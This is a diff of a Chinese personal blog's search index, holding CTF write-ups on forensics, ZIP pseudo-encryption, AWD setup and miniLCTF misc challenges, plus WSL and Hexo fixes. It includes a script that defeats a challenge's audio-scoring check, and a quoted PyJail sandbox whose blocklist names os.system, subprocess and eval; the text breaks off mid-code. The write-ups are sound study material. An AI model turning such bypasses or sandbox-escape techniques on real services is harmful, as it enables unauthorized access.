-MiniForensicsⅡ我们打开取证，在C盘的user下的document里发现nihao的文件夹
-里面是一个pwd.txt和压缩包，pwd提醒我们密码是7位数字，爆破得到密码是：1846287
-
-
-我们使用winrar解压得到sslkeylog文件。
-在桌面上发现有pcapng文件，ssl解密，http流量里发现一个压缩包
-保存下来发现里面有useless.png和一个txt
-我们使用png文件头爆破得到三串密钥：45797e52 f747cc4c 800bd117
-
-
-导出，得到txt里面内容：
-aHR0cHM6Ly9naXRodWIuY29tL3Jvb3QtYWRtaW4tdXNlci93aGF0X2RvX3lvdV93YW5uYV9maW5kLmdpdA==
-
-也就是指向了这个地址：https://github.com/root-admin-user/what_do_you_wanna_find.git
-访问，在脚本里发现一串哈希值：89045a3653af483b6bb390e27c10db16873a60d1
-脚本里面提示我们historical commits
-直接访问Add files via upload · root-admin-user&#x2F;what_do_you_wanna_find@89045a3
-发现隐藏内容，发现是代码混淆，发现flag。
-flag：miniLCTF{c0ngr4tul4ti0n5_70u’v3_g0t_th3_s3cr3ts}
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>WP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>WP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>TGCTF2025misc全解</title>
     <url>/2025/04/TGCTF2025misc%E5%85%A8%E8%A7%A3/</url>
     <content><![CDATA[这次比赛还是挺好玩的，尤其是 misc方向，ez_zip是挺好一题目，图片秘密也不错，如果一开始的附件就是好的就会更好了。
@@ -2259,313 +2033,6 @@ TGCTF{You_caught_up_with_time!}
       <tags>
         <tag>CTF</tag>
         <tag>WP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>wsl启动出错</title>
-    <url>/2024/12/wsl%E5%90%AF%E5%8A%A8%E5%87%BA%E9%94%99/</url>
-    <content><![CDATA[wsl启动出错启动出错如下：
-由于未安装所需的特性，无法启动操作。错误代码: Wsl/Service/CreateInstance/CreateVm/HCS/HCS_E_SERVICE_NOT_AVAILABLEPress any key to continue...
-
-
-
-1.启用了 WSL 所需的功能可以以管理员身份在powershell输入以下命令：
-dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestartdism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
-
-然后重启电脑，看wsl还能运行吗
-我是运行了这个就好了，界面：
-C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart部署映像服务和管理工具版本: 10.0.26100.1150映像版本: 10.0.26100.2454启用一个或多个功能[==========================100.0%==========================]操作成功完成。C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart部署映像服务和管理工具版本: 10.0.26100.1150映像版本: 10.0.26100.2454启用一个或多个功能[==========================100.0%==========================]操作成功完成。
-
-
-
-2.更新 WSL 核心WSL 需要最新版本的核心来支持虚拟机实例。更新核心：
-wsl --update
-
-运行后检查版本
-wsl --version
-
-
-
-3.检查虚拟化支持确保启用了虚拟化支持
-4.重置或重装 WSL实在不行重置 WSL：
-wsl --unregister &lt;你的发行版名称&gt;
-
-或者重装 WSL：
-wsl --install
-
-
-
-5.检查 Windows 服务错误代码中提到 HCS_E_SERVICE_NOT_AVAILABLE 可能表明相关服务未运行：
-按 
-Win + R
-
- 键，输入 
-services.msc
-
-，检查以下服务是否已启动：
-Hyper-V Host Compute Service
-Virtual Machine Management
-如果未启动，右键启动这些服务。
-]]></content>
-      <tags>
-        <tag>wsl</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>blog 为何上传不了图像的解决</title>
-    <url>/2024/11/blog-%E4%B8%BA%E4%BD%95%E4%B8%8A%E4%BC%A0%E4%B8%8D%E4%BA%86%E5%9B%BE%E5%83%8F%E7%9A%84%E8%A7%A3%E5%86%B3/</url>
-    <content><![CDATA[前两天我一直困在为何博客上传不了图像而现在我似乎找到了解决方法首先你要先下了hexo-asset-image
-而且在config.yml里有个post_asset_folder:要为true
-要做到创建新博客时候能在同目录下自动创建同名文件夹，img就可以放在这个文件夹里面
-然后再typora里设置要选择优先相对路径（这个很重要
-保证相对路径的时候再插入图片
-插入图片后查看github对应的文件夹下面有没有相应的图片
-因为本质上插入的图片引用的是github的路径，如果github对应目录上没有该图片的话自然在博客上显示不出来
-然后再
-hexo g
-
-hexo s
-
-hexo d
-
-三连试试，每试完一遍可以直接去github上看看，如果没有这个图片的话试试这个
-hexo clean
-
-就这四个来回试，直到对应的github文件夹下出现对应图片就可以上传成功了
-
-类似于这样，要在github目录下能看到，而且似乎图片的命名要简单（？
-如果还传不上去的话可以缩放图片试试
-（猜想：说不定可以直接在github上add file，下次试试）
-ps：（这是不是图片加载慢的原因？）
-顺便记录一下我博客的其他问题的解决友链我靠我之前友链一直不能输中文，否则就会报错+显示不了
-现在才发现是vs的问题，，用记事本编辑就能正常上传+打开了。服了
-评论区我用的是Valine，要去LeanCloud注册账号才行，网上教程很多
-但是好像有泄露的风险？
-搜索我是去algolia注册账号才能搜索的
-结果发现只能所搜文章的标题，不能搜索文章里的内容（我要你有啥用？
-待解决
-]]></content>
-      <tags>
-        <tag>blog</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>newstar2024小明同学们复现</title>
-    <url>/2024/12/newstar2024%E5%B0%8F%E6%98%8E%E5%90%8C%E5%AD%A6%E4%BB%AC%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[主要最近发现自己的取证题目比较薄弱，于是拿小明同学们练练手。
-1.热心助人的小明同学这个很简单，只要装好vol2，然后lsadump看密码就好
-先看操作版本
-vol.py -f image.raw imageinfo
-
-
-
-看到操作版本是 Win7SP1x86_23418
-然后直接lsadump就好
-
-
-密码：ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh（开头的0x48不是密码）
-所以flag：flag{ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh}
-2.擅长音游的小明同学拿到一个chal_fixed.E01文件，使用FTK挂载 （最好用4.2版本的
-在win7那个下面的root/users/desktop可以看到
-
-
-
-[!NOTE]
-真相.txt
-真相会不经意间流入日常的点点滴滴……真相在哪里?
-
-
-[!NOTE]
-要开始了呦.txt
-今天舞萌彩框了好开心啊o(￣▽￣)ブ我要把这一刻用照片保存下来不过在拍摄rating变化的瞬间总感觉有什么东西藏进照片里了打开也没发现什么异常，但是体积好像变大了一点是错觉吗？
-
-可以发现跟图片有关，而在照片文件里面找到ColorfulDog.jpg
-
-
-没啥思路了binwalk一下（感觉挺正常的
-发现一个txt内容是：
-听好了听好了听好了听好了听好了听好了听好了： 1919年8月10日，世界就此陷落， 陷落的世界都将迎来一场漩涡， 为这个世界带来有关弗拉格尚未知晓的真相。 但发掘真相的道路被加诸混沌的历练 世界的宽高未被正确丈量 当真相被混沌打乱时 真相将不复存在 也许，在世界的重置和轮回中能找到发现真相的方法…… 至此，尘埃落定 至此，一锤定音 #音游# #NewStarcaea# #Misc#
-然后我们挂载这个E01，注意要在FTK上右键加载镜像，进行加载
-
-
-使用VM挂载一下，注意要用管理员运行。
-这里要选择UEFI
-
-
-挂载出问题了。。。
-3.擅长加密的小明同学拿到了一个vhd和一个君は加密本当に上手だな.zip，解压得到一个raw文件
-vhd双击打开发现要BitLocker解密，我们使用Elcomsoft Forensic Disk Decryptor
-选择decrypt or mount disk / image file of disk\partition
-
-
-进行恢复，得到key：408320-285065-614779-610940-547107-218229-492195-125422
-输入恢复密钥之后得到了一个flag.7z，解压需要密码。
-7z在密码复杂的情况下几乎不可能被爆破出来，所以我们看raw文件。
-查看操作版本
-
-
-查看有什么进程
-
-
-看到有一个mspaint.exe（画图进程），我们提取出来，使用 memdump：
-
-
-然后改后缀为data，拉入GIMP.
-图像类型选择RGB透明，拉X,Y,Z，最后得到：
-
-
-压缩包密码：rxnifbeiyomezpplugho
-解压出来得到：flag{5ZCb44Gv5Y+W6K+B5pys5b2T44Gr5LiK5omL}
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>WP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>misc</tag>
-        <tag>WP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于ZIP伪加密</title>
-    <url>/2025/02/%E5%85%B3%E4%BA%8EZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
-    <content><![CDATA[ZIP伪加密看似简单，实则也是大有学问在里面
-这里细节讲解一下伪加密和相关工具的使用
-首先我们需要了解一下zip文件结构
-zip文件结构zip文件结构大致分为三个部分
-一个record区，一个dirEntry区，一个endLocator区
-三个部分相互依存，这里是010下的zip文件对照表
-+ ZIPFILERECORD record # 压缩源文件数据区    - char frSignature[4] # 压缩源文件标志    - ushort frVersion # 压缩源文件版本    - ushort frFlags # 压缩源文件标志 （有无加密，偶数位修改了最低位所以会显示有密码）    - enum COMPTYPE frCompression    - DOSTIME frFileTime # 压缩源文件时间    - DOSDATE frFileDate # 压缩源文件日期    - uint frCrc # 压缩源文件CRC32校验值    - uint frCompressedSize # 压缩源文件压缩后大小    - uint frUncompressedSize # 压缩源文件压缩前大小    - ushort frFileNameLength # 压缩源文件名长度    - ushort frExtraFieldLength # 压缩源文件扩展域长度    - char frFileName[frFileNameLength] # 压缩源文件名    - uchar frData[frCompressedSize] # 压缩源文件数据+ ZIPDIRENTRY dirEntry # 压缩源文件目录区    - char deSignature[4] # 目录标志    - ushort deVersionMadeBy # 创建该条目的版本    - ushort deVersionNeeded # 解压该条目所需的版本    - ushort deFlags # 标志位 （有无加密，偶数位修改了最低位所以会显示有密码）    - enum COMPTYPE deCompression # 压缩方法    - DOSTIME deFileTime # 最后修改时间    - DOSDATE deFileDate # 最后修改日期    - uint deCrc # CRC32校验值    - uint deCompressedSize # 压缩后的大小    - uint deUncompressedSize # 压缩前的大小    - ushort deFileNameLength # 文件名长度    - ushort deExtraFieldLength # 扩展域长度    - ushort deFileCommentLength # 文件评论长度    - ushort deDiskNumberStart # 起始磁盘编号    - ushort deInternalAttributes # 内部属性    - uint deExternalAttributes # 外部属性    - uint deRelativeOffset # 该条目在 ZIP 文件中的偏移位置    - char deFileName[deFileNameLength] # 文件名    - char deExtraField[deExtraFieldLength] # 扩展域    - char deFileComment[deFileCommentLength] # 文件评论+ ZIPENDLOCATOR endLocator # 压缩源文件目录结束标志    - char elSignature[4] # 结束标志    - ushort elDiskNumber # 当前磁盘编号    - ushort elStartDiskNumber # 目录开始的磁盘编号    - ushort elEntriesOnDisk # 当前磁盘上的条目数量    - ushort elEntriesTotal # 总条目数量    - uint elSizeOfDirectory # 目录的总大小    - uint elOffsetOfDirectory # 目录开始的偏移位置    - ushort elCommentLength # 注释长度    - char elComment[elCommentLength] # 注释
-
-可以发现最重要的就是两个标志位了，他们是判断伪加密的标准
-其实其余部分也很重要，因为如果不对应的话直接解压会发现报错——CRC校验错误
-首先我们要知道
-
-全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性，即：                                             第二个数字为奇数时 –&gt;加密                                             第二个数字为偶数时 –&gt;未加密
-
-也就是说，0900&#x2F;0100代表着加密，0000&#x2F;0800代表着无加密
-而伪加密就是把本来无加密的文件修改了标志位从而显示出加密的样子
-那我们怎么修改伪加密呢？为什么有些工具可以直接解压有些却不行呢？
-工具选择010editor010editor肯定是最普遍和最准确的修改伪加密的东西了
-如果是伪加密的话直接010修改0900为0000
-如果两区（record和dirEntry）都是0900直接全改即可
-bandizip经过测试，bandizip识别一个文件是否加密是通过看dirEntry记录中的deflag位
-如果deFlag位是加密的话无论另一个frflag是否是加密bandizip都会识别为加密
-winRARwinRAR和bandizip一样，都是识别dirEntry记录中的deflag位
-7zip7z就很神奇，它与上面两个工具不同。
-7zip判断是否为加密的方式是看record记录中的frflag位
-因此有些明明是伪加密的zip 7z却能直接解压
-所以那句“不会出的出题人只修改一个struct区”是因为换个工具就能解压
-随波逐流经过测试，随波逐流提供的伪加密修复只会修改dirEntry记录中的deflag位，而不管frFlag位
-ZipCenOp不好用！！
-运行
-java -jar ZipCenOp.jar -r 111.zip
-
-会显示
-success 1 flag(s) found
-但是它不帮我改，有啥用？。。
-其他工具传闻2345好压改两个区也能直接开。而且还有360解压缩
-然而我不敢尝试，怕删不干净。。
-细节注意zip伪加密还有一个细节需要注意的是我们都知道两个flag位置改成奇数时加密，偶数时无加密
-那改成奇数时0100和0900有什么区别，能不能乱改？？
-答案是否定的。
-
-8神提供的解释：
-这两字节就叫Flags，010模板中写fr和de是为区分filerecord块和direntry块。Flags两字节一共16bit，只有最低位用于记录加密与否，倒数第2 3两个bit记录压缩选项，大部分情况下修改不会出现问题，但如果将这两字节修改为09的话就会修改倒数第4个bit：记录数据描述符，如果这个bit是1，则表示标头中的CRC32和文件大小未知，但它们的实际数据会以额外的12或16字节结构出现在压缩数据后面。把一个实际上没有数据描述符的压缩包的flags倒数第4个bit改成1会导致软件被指示去读取一个不存在的描述符片段，从而导致后续的数据读取全部错乱，进而解压失败。
-
-感觉实际情况的时候无法很明确的判断是改成0900还是0100，建议两种都试试，那种对了就用哪种
-flag通用位置位详解pkware.cachefly.net&#x2F;webdocs&#x2F;casestudies&#x2F;APPNOTE.TXT
-这是zip结构的格式规范。
-根据zip文件规范，flag位置有16个字节，每个字节都有不同的含义：
-
-
-
-位（从右往左）
-详细描述
-
-
-
-0
-如果设置，表示文件已加密。（flag是奇数的话就会使这一位为1，显示为加密）
-
-
-1
-对于压缩方法6（Imploding），表示使用8K滑动字典（否则为4K）。对于方法8和9（Deflate），与位1结合表示压缩选项。
-
-
-2
-对于方法6（Imploding），表示使用3个Shannon-Fano树（否则为2个）。对于方法8和9，结合位1表示压缩选项。
-
-
-3
-如果设置，CRC-32、压缩大小和未压缩大小在本地文件头中为零，实际值在数据描述符中。（即表示标头的CRC32和文件大小未知，读取数据时）
-
-
-4
-保留用于方法8（Deflate）的增强功能。
-
-
-5
-如果设置，表示文件包含压缩后的补丁数据（需要PKZIP 2.70或更高版本）。
-
-
-6
-强加密。如果设置，提取所需版本号至少为50，且位0必须设置。对于AES加密，版本号至少为51。
-
-
-7
-目前未使用。
-
-
-8
-目前未使用。
-
-
-9
-目前未使用。
-
-
-10
-目前未使用。
-
-
-11
-语言编码标志（EFS）。如果设置，文件名和注释字段必须使用UTF-8编码（见附录D）。
-
-
-12
-保留用于PKWARE的增强压缩。
-
-
-13
-如果设置，表示中央目录已加密，本地文件头中的某些字段被掩码。
-
-
-14
-保留用于PKWARE的替代流。
-
-
-15
-保留用于PKWARE。
-
-
-那么0900和0100有什么区别呢？
-已知在 010editor 使用了小端字节序，所以0900实际上也就是0x0009
-（什么是小端字节序？）
-拆分成二进制也就是
-0000 0000 0000 1001
-
-所以它修改了第0位和第3位，相对的，0100也就只修改了第0位
-第0位代表着加密与否，所以0900和0100都代表着zip加密了
-而0900比0100多修改了第三位，表示CRC-32、压缩大小和未压缩大小在本地文件头中为零，实际值在数据描述符中。
-也就是8神所说的“表示标头中的CRC32和文件大小未知”，所以乱修改的话读取会错乱。
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -3742,7 +3209,7 @@ flag：flag{sp3tr0gr4m0ph0n3}
 追踪tcp流之后发现
 ![屏幕截图 2025-03-03 115626](.&#x2F;Misc-Record&#x2F;屏幕截图 2025-03-03 115626.png)
 这个就是发送者的邮箱了xsser@live.cn
-flag{&#120;&#115;&#x73;&#101;&#x72;&#64;&#x6c;&#x69;&#x76;&#101;&#x2e;&#x63;&#110;}
+flag{&#x78;&#x73;&#115;&#101;&#x72;&#64;&#108;&#105;&#118;&#101;&#46;&#x63;&#x6e;}
 131.蜘蛛侠呀一段流量。
 发现icmp后面每段都带有一段的data数据，猜测是将一个文件分散在了这里。
 可以使用tshark导出这些数据，然后去重，再用脚本
@@ -4768,8 +4235,580 @@ flag：SICTF{88a39373-e204-43b6-b321-33ac8972fde9}
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>misc</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>blog 为何上传不了图像的解决</title>
+    <url>/2024/11/blog-%E4%B8%BA%E4%BD%95%E4%B8%8A%E4%BC%A0%E4%B8%8D%E4%BA%86%E5%9B%BE%E5%83%8F%E7%9A%84%E8%A7%A3%E5%86%B3/</url>
+    <content><![CDATA[前两天我一直困在为何博客上传不了图像而现在我似乎找到了解决方法首先你要先下了hexo-asset-image
+而且在config.yml里有个post_asset_folder:要为true
+要做到创建新博客时候能在同目录下自动创建同名文件夹，img就可以放在这个文件夹里面
+然后再typora里设置要选择优先相对路径（这个很重要
+保证相对路径的时候再插入图片
+插入图片后查看github对应的文件夹下面有没有相应的图片
+因为本质上插入的图片引用的是github的路径，如果github对应目录上没有该图片的话自然在博客上显示不出来
+然后再
+hexo g
+
+hexo s
+
+hexo d
+
+三连试试，每试完一遍可以直接去github上看看，如果没有这个图片的话试试这个
+hexo clean
+
+就这四个来回试，直到对应的github文件夹下出现对应图片就可以上传成功了
+
+类似于这样，要在github目录下能看到，而且似乎图片的命名要简单（？
+如果还传不上去的话可以缩放图片试试
+（猜想：说不定可以直接在github上add file，下次试试）
+ps：（这是不是图片加载慢的原因？）
+顺便记录一下我博客的其他问题的解决友链我靠我之前友链一直不能输中文，否则就会报错+显示不了
+现在才发现是vs的问题，，用记事本编辑就能正常上传+打开了。服了
+评论区我用的是Valine，要去LeanCloud注册账号才行，网上教程很多
+但是好像有泄露的风险？
+搜索我是去algolia注册账号才能搜索的
+结果发现只能所搜文章的标题，不能搜索文章里的内容（我要你有啥用？
+待解决
+]]></content>
+      <tags>
+        <tag>blog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>awd初体验</title>
+    <url>/2024/12/awd%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
+    <content><![CDATA[前言哎，，再次感到misc果然还是要会点web或者re才行
+这个awd会给你一个服务器需要你ssh连接起来，连起来之后需要tar下html里面的东西，然后查杀漏洞，维护，攻击别人的。
+以bugku的awd为例报名比赛后能得到一些东西，比如ip白名单，账号密码，token，虚拟ip等
+ip白名单——队长加的队员ip
+账号密码——一会连ssh有用（以：分隔）
+token——提交flag时用
+虚拟ip——连ssh，注意端口是2222
+使用Tabby连接项目地址： https://tabby.sh/ 注意要下windows的（tabby基础讲解： 这里）
+打开后点开设置/配置与连接
+
+
+点击新建/新配置，选择ssh连接
+看到一个空白页面，填写：
+名称—主机—端口—用户名—密码
+如下：
+
+
+然后点击新建页面旁边的那个框框，再选择刚刚建的ssh就可以开始连接了
+
+
+等一会就连接成功了
+SFTP传输工具tabby是自带sftp工具的，连接成功后在右上角就能看到
+点开后能弹出服务器上的目录，如果想下载里面的一些东西可以直接点击会出现保存文件的提示，然后保存就行
+如果想上传文件可以直接拖拽文件，也能点右上角的upload
+html相关下载——tar命令连接成功之后可以打包下载html里的东西了，在var/www/html里。
+但是html是无法直接下的，那怎么办呢？使用tar命令
+tar -czvf myfolder.tar.gz /var/www/html/*# 这个命令会打包html里的所有东西tar -czvf web.tar.gz ./*# 打包当前目录下所有东西到当前文件夹下
+
+打包完成的东西在home的一个文件夹里（这里是忘了具体在哪了。。）
+然后就能看到一个myfolder.tar.gz或者web.tar.gz，直接点击保存下来就好
+查找漏洞+修改+上传保存下来的html文件夹可以用D盾来扫描漏洞，然后找到对应漏洞，修改。
+这里可以直接在tabby上的服务器文件里修改，或者本地修改完再上传到服务器上
+改完漏洞就能加固我们的防御了。
+沙箱跑木马我们可以利用在线沙箱来跑恶意代码，顺便让它帮我们分析一下
+安恒云沙箱： 安恒云沙箱-下一代沙箱的领航者
+如果是哥斯拉，蚁剑，冰蝎，天蝎，之类的常规工具可以直接分析出来
+apache日志分析
+常见日志文件位置
+
+
+
+Apache日志
+访问日志 ：默认位置通常是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log.1（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log.1（CentOS&#x2F;RHEL）。
+错误日志 ：默认位置通常是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log.1（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log.1（CentOS&#x2F;RHEL）。
+
+
+SSH日志
+身份验证日志 ：通常位于&#x2F;var&#x2F;log&#x2F;auth.log（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;secure（CentOS&#x2F;RHEL）。
+
+
+系统日志
+系统日志 ：通常位于&#x2F;var&#x2F;log&#x2F;syslog（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;messages（CentOS&#x2F;RHEL）。
+
+
+
+
+我们可以进入/var/log/apache2日志目录。
+可以dump下来分析，也可以直接在上面筛选
+需要一定的linux知识
+
+
+cut: 这是一个命令，用于从每一行文本中剪切出指定部分。
+-d-: 指定分隔符为 -
+-f 1: 指定要剪切的字段为第一个字段。
+access.log.1: 这是要处理的日志文件的文件名或路径。
+
+
+uniq -c: 这个命令会从输入中删除重复的行，并且计算每行重复出现的次数。
+-c: 会在输出中显示每行重复出现的次数。
+
+
+sort : 这个命令会对输入进行排序。
+-r: 表示反向排序，即降序排列。
+-n: 表示按照数值大小排序。
+
+
+head -20: 最后，这个命令会从排序后的结果中提取前 20 行。
+| : 管道命令符，表示前一项的输出结果作为后一项的输入
+
+
+]]></content>
+      <categories>
+        <category>AWD</category>
+      </categories>
+      <tags>
+        <tag>awd</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>newstar2024小明同学们复现</title>
+    <url>/2024/12/newstar2024%E5%B0%8F%E6%98%8E%E5%90%8C%E5%AD%A6%E4%BB%AC%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[主要最近发现自己的取证题目比较薄弱，于是拿小明同学们练练手。
+1.热心助人的小明同学这个很简单，只要装好vol2，然后lsadump看密码就好
+先看操作版本
+vol.py -f image.raw imageinfo
+
+
+
+看到操作版本是 Win7SP1x86_23418
+然后直接lsadump就好
+
+
+密码：ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh（开头的0x48不是密码）
+所以flag：flag{ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh}
+2.擅长音游的小明同学拿到一个chal_fixed.E01文件，使用FTK挂载 （最好用4.2版本的
+在win7那个下面的root/users/desktop可以看到
+
+
+
+[!NOTE]
+真相.txt
+真相会不经意间流入日常的点点滴滴……真相在哪里?
+
+
+[!NOTE]
+要开始了呦.txt
+今天舞萌彩框了好开心啊o(￣▽￣)ブ我要把这一刻用照片保存下来不过在拍摄rating变化的瞬间总感觉有什么东西藏进照片里了打开也没发现什么异常，但是体积好像变大了一点是错觉吗？
+
+可以发现跟图片有关，而在照片文件里面找到ColorfulDog.jpg
+
+
+没啥思路了binwalk一下（感觉挺正常的
+发现一个txt内容是：
+听好了听好了听好了听好了听好了听好了听好了： 1919年8月10日，世界就此陷落， 陷落的世界都将迎来一场漩涡， 为这个世界带来有关弗拉格尚未知晓的真相。 但发掘真相的道路被加诸混沌的历练 世界的宽高未被正确丈量 当真相被混沌打乱时 真相将不复存在 也许，在世界的重置和轮回中能找到发现真相的方法…… 至此，尘埃落定 至此，一锤定音 #音游# #NewStarcaea# #Misc#
+然后我们挂载这个E01，注意要在FTK上右键加载镜像，进行加载
+
+
+使用VM挂载一下，注意要用管理员运行。
+这里要选择UEFI
+
+
+挂载出问题了。。。
+3.擅长加密的小明同学拿到了一个vhd和一个君は加密本当に上手だな.zip，解压得到一个raw文件
+vhd双击打开发现要BitLocker解密，我们使用Elcomsoft Forensic Disk Decryptor
+选择decrypt or mount disk / image file of disk\partition
+
+
+进行恢复，得到key：408320-285065-614779-610940-547107-218229-492195-125422
+输入恢复密钥之后得到了一个flag.7z，解压需要密码。
+7z在密码复杂的情况下几乎不可能被爆破出来，所以我们看raw文件。
+查看操作版本
+
+
+查看有什么进程
+
+
+看到有一个mspaint.exe（画图进程），我们提取出来，使用 memdump：
+
+
+然后改后缀为data，拉入GIMP.
+图像类型选择RGB透明，拉X,Y,Z，最后得到：
+
+
+压缩包密码：rxnifbeiyomezpplugho
+解压出来得到：flag{5ZCb44Gv5Y+W6K+B5pys5b2T44Gr5LiK5omL}
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+        <tag>CTF</tag>
+        <tag>WP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>wsl启动出错</title>
+    <url>/2024/12/wsl%E5%90%AF%E5%8A%A8%E5%87%BA%E9%94%99/</url>
+    <content><![CDATA[wsl启动出错启动出错如下：
+由于未安装所需的特性，无法启动操作。错误代码: Wsl/Service/CreateInstance/CreateVm/HCS/HCS_E_SERVICE_NOT_AVAILABLEPress any key to continue...
+
+
+
+1.启用了 WSL 所需的功能可以以管理员身份在powershell输入以下命令：
+dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestartdism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
+
+然后重启电脑，看wsl还能运行吗
+我是运行了这个就好了，界面：
+C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart部署映像服务和管理工具版本: 10.0.26100.1150映像版本: 10.0.26100.2454启用一个或多个功能[==========================100.0%==========================]操作成功完成。C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart部署映像服务和管理工具版本: 10.0.26100.1150映像版本: 10.0.26100.2454启用一个或多个功能[==========================100.0%==========================]操作成功完成。
+
+
+
+2.更新 WSL 核心WSL 需要最新版本的核心来支持虚拟机实例。更新核心：
+wsl --update
+
+运行后检查版本
+wsl --version
+
+
+
+3.检查虚拟化支持确保启用了虚拟化支持
+4.重置或重装 WSL实在不行重置 WSL：
+wsl --unregister &lt;你的发行版名称&gt;
+
+或者重装 WSL：
+wsl --install
+
+
+
+5.检查 Windows 服务错误代码中提到 HCS_E_SERVICE_NOT_AVAILABLE 可能表明相关服务未运行：
+按 
+Win + R
+
+ 键，输入 
+services.msc
+
+，检查以下服务是否已启动：
+Hyper-V Host Compute Service
+Virtual Machine Management
+如果未启动，右键启动这些服务。
+]]></content>
+      <tags>
+        <tag>wsl</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>miniLCTF2025misc全解</title>
+    <url>/2025/05/miniLCTF2025misc%E5%85%A8%E8%A7%A3/</url>
+    <content><![CDATA[吃豆人简单的前端游戏，不知道为什么扔到misc了。。
+看一眼源码
+
+
+那就预先在控制台输好score
+输完再私一下就拿到flag
+
+
+
+
+麦霸评分先本地wsrx连接上环境，我这里是6033
+题目要求唱歌然后打分，我们py写个脚本把原始音频下过来，再传上去就好了
+#!/usr/bin/env python3# -*- coding: utf-8 -*-import requestsdef get_flag(base_url: str = &quot;http://127.0.0.1:6033&quot;):    session = requests.Session()    # 1. 先下载原始音频    print(&quot;[*] 正在下载原始音频…&quot;)    resp = session.get(f&quot;&#123;base_url&#125;/original.wav&quot;)    resp.raise_for_status()    audio_data = resp.content    # （可选）调用一次 /prepare-recording 来清理旧录音    try:        session.get(f&quot;&#123;base_url&#125;/prepare-recording&quot;, timeout=5)    except Exception:        pass  # 出错也不影响    # 2. 上传「你的录音」——其实就是原始音频本身    print(&quot;[*] 正在上传“录音”进行对比…&quot;)    files = &#123;        &#x27;audio&#x27;: (&#x27;original.wav&#x27;, audio_data, &#x27;audio/wav&#x27;)    &#125;    resp2 = session.post(f&quot;&#123;base_url&#125;/compare-recording&quot;, files=files)    resp2.raise_for_status()    # 3. 解析返回的 JSON，拿 flag    data = resp2.json()    if data.get(&quot;flag&quot;):        print(&quot;🎉 Flag:&quot;, data[&quot;flag&quot;])    else:        print(&quot;⚠️ 服务器返回:&quot;, data)if __name__ == &quot;__main__&quot;:    get_flag()
+
+
+
+
+
+PyJail连上即给源码
+import socketserverimport sysimport astimport iowith open(__file__, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:    source_code = f.read()class SandboxVisitor(ast.NodeVisitor):    def visit_Attribute(self, node):        if isinstance(node.attr, str) and node.attr.startswith(&quot;__&quot;):            raise ValueError(&quot;Access to private attributes is not allowed&quot;)        self.generic_visit(node)def safe_exec(code: str, sandbox_globals=None):    original_stdout = sys.stdout    original_stderr = sys.stderr    sys.stdout = io.StringIO()    sys.stderr = io.StringIO()    if sandbox_globals is None:        sandbox_globals = &#123;            &quot;__builtins__&quot;: &#123;                &quot;print&quot;: print,                &quot;any&quot;: any,                &quot;len&quot;: len,                &quot;RuntimeError&quot;: RuntimeError,                &quot;addaudithook&quot;: sys.addaudithook,                &quot;original_stdout&quot;: original_stdout,                &quot;original_stderr&quot;: original_stderr            &#125;        &#125;    try:        tree = ast.parse(code)        SandboxVisitor().visit(tree)        exec(code, sandbox_globals)        output = sys.stdout.getvalue()        sys.stdout = original_stdout        sys.stderr = original_stderr        return output, sandbox_globals    except Exception as e:        sys.stdout = original_stdout        sys.stderr = original_stderr        return f&quot;Error: &#123;str(e)&#125;&quot;, sandbox_globalsCODE = &quot;&quot;&quot;def my_audit_checker(event, args):    blocked_events = [        &quot;import&quot;, &quot;time.sleep&quot;, &quot;builtins.input&quot;, &quot;builtins.input/result&quot;, &quot;open&quot;, &quot;os.system&quot;,         &quot;eval&quot;,&quot;subprocess.Popen&quot;, &quot;subprocess.call&quot;, &quot;subprocess.run&quot;, &quot;subprocess.check_output&quot;    ]    if event in blocked_events or event.startswith(&quot;subprocess.&quot;):        raise RuntimeError(f&quot;Operation not allowed: &#123;event&#125;&quot;)addaudithook(my_audit_checker)&quot;&quot;&quot;class 